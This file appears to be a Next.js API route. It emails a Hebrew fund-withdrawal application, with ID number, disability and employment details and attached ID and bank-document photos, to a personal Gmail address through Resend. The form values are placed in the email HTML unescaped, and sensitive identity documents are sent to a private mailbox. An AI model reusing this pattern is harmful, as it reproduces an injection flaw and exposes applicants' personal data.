import { NextResponse } from 'next/server';
import { Resend } from 'resend';

const resendApiKey = process.env.RESEND_API_KEY;
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB limit

if (!resendApiKey) {
  console.error('Missing RESEND_API_KEY environment variable');
}

const resend = new Resend(resendApiKey);

export async function POST(request) {
  if (!resendApiKey) {
    return NextResponse.json(
      { error: 'Server configuration error: Missing API key' },
      { status: 500 }
    );
  }

  try {
    const formData = await request.formData();
    
    // Process attachments
    const attachments = [];
    const files = ['idFront', 'idBack', 'idAttachment', 'bankApproval'];
    
    for (const file of files) {
      const uploadedFile = formData.get(file);
      if (uploadedFile && uploadedFile instanceof Blob) {
        if (uploadedFile.size > MAX_FILE_SIZE) {
          return NextResponse.json(
            { error: `הקובץ ${file} גדול מדי. הגודל המקסימלי הוא 5MB` },
            { status: 400 }
          );
        }

        try {
          const buffer = await uploadedFile.arrayBuffer();
          attachments.push({
            filename: uploadedFile.name || `${file}.jpg`,
            content: Buffer.from(buffer)
          });
        } catch (fileError) {
          console.error(`Error processing file ${file}:`, fileError);
          return NextResponse.json(
            { error: `שגיאה בעיבוד הקובץ ${file}` },
            { status: 400 }
          );
        }
      }
    }

    const emailContent = `<div dir="rtl" style="text-align: right; direction: rtl; font-family: Arial, sans-serif;">
      <h1 style="color: #333; border-bottom: 2px solid #1b283c; padding-bottom: 10px;">פרטי טופס חדש</h1>
      
      <div style="margin: 20px 0;">
        <h3 style="color: #1b283c;">⚡ סטטוס תעסוקה</h3>
        <p>• סיים לעבוד: ${formData.get('finishedWork')}</p>
        <p>• תאריך סיום: ${formData.get('endDate') || 'לא צוין'}</p>
        <p>• טפסי 161: ${formData.get('closingPapers')}</p>
        <p>• עובד כיום: ${formData.get('currentEmploymentStatus')}</p>
        <p>• משכורת נוכחית: ${formData.get('salary') || 'לא צוין'}</p>
        <p>• מעסיק נוכחי: ${formData.get('employerName') || 'לא צוין'}</p>
      </div>

      <div style="margin: 20px 0;">
        <h3 style="color: #1b283c;">🏥 מצב רפואי ופיננסי</h3>
        <p>• בעיות משפטיות: ${formData.get('financialIssues')}</p>
        <p>• נכות: ${formData.get('disability')}</p>
        <p>• תביעת נכות: ${formData.get('disabilityClaim')}</p>
      </div>

      <div style="margin: 20px 0;">
        <h3 style="color: #1b283c;">👤 פרטים אישיים</h3>
        <p>• שם מלא: ${formData.get('fullName')}</p>
        <p>• טלפון: ${formData.get('phone')}</p>
        <p>• ת.ז: ${formData.get('idNumber')}</p>
        <p>• עיר: ${formData.get('city')}</p>
        <p>• מוכן לשיחה: ${formData.get('transparentCall')}</p>
      </div>

      <div style="margin: 20px 0;">
        <h3 style="color: #1b283c;">📎 קבצים מצורפים</h3>
        <p>• צילום ת.ז - צד 1: ${formData.get('idFront') ? '✓' : '✗'}</p>
        <p>• צילום ת.ז - צד 2: ${formData.get('idBack') ? '✓' : '✗'}</p>
        <p>• צילום ספח ת.ז: ${formData.get('idAttachment') ? '✓' : '✗'}</p>
        <p>• אישור ניהול חשבון בנק: ${formData.get('bankApproval') ? '✓' : '✗'}</p>
      </div>
    </div>`;

    try {
      const data = await resend.emails.send({
        from: 'onboarding@resend.dev',
        to: 'shhadytours@gmail.com',
        subject: 'טופס חדש - משיכת כספים',
        html: emailContent,
        attachments: attachments
      });

      return NextResponse.json({ success: true, data });
    } catch (emailError) {
      console.error('Resend API Error:', emailError);
      return NextResponse.json(
        { error: 'שגיאה בשליחת האימייל' },
        { status: 500 }
      );
    }
  } catch (error) {
    console.error('Error processing request:', error);
    return NextResponse.json(
      { error: 'שגיאה בעיבוד הבקשה' },
      { status: 500 }
    );
  }
} 